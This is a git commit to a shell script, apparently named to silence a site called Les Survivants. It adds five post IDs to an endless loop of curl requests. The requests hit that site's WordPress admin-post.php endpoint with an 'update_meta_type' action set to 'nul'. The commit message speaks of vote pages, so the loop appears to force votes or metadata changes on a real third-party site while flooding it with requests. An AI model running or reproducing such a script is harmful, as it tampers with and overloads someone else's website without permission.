2600f8069027d6d0f93efb921a96571860a8b8bf
Pr0gmaT1k <julien.cloupet@gmail.com>
2016-08-08 15:17:31 +0200

    Add all the other vote page

--- STFULesSurvivants.sh
+++ STFULesSurvivants.sh
@@ -1,3 +1,8 @@
 while true; do
     curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=444&type=nul"
+    curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=140&type=nul"
+    curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=142&type=nul"
+    curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=144&type=nul"
+    curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=146&type=nul"
+    curl "http://lessurvivants.com/wp-admin/admin-post.php?action=update_meta_type&post_id=117&type=nul"
 done
